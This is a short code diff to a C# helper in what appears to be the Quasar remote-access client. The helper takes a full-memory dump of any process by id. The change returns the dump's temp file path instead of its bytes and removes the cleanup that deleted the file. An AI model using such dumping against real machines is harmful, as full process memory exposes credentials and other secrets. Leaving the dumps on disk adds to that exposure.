@@ -13,9 +13,8 @@ namespace Quasar.Client.Helper
         /// <param name="pid">Process id of the process to dump</param>
         /// <param name="type">What kind of memory dump to do</param>
         /// <returns></returns>
-        public static byte[] GetProcessDump(int pid, NativeMethods.MiniDumpType type = NativeMethods.MiniDumpType.MiniDumpWithFullMemory)
+        public static (string, bool) GetProcessDump(int pid, NativeMethods.MiniDumpType type = NativeMethods.MiniDumpType.MiniDumpWithFullMemory)
         {
-            byte[] dumpBytes = new byte[] { };
             Process process = Process.GetProcessById(pid);
             string tmpFile = Path.GetTempFileName();
             try
@@ -34,14 +33,14 @@ namespace Quasar.Client.Helper
                 }
                 if (success)
                 {
-                    dumpBytes = File.ReadAllBytes(tmpFile);
+                    return (tmpFile, true);
                 }
             }
-            finally
+            catch (Exception ex)
             {
-                try { File.Delete(tmpFile); } catch { }
+                return (ex.ToString(), false);
             }
-            return dumpBytes;
+            return ("", false);
         }
     }
 }
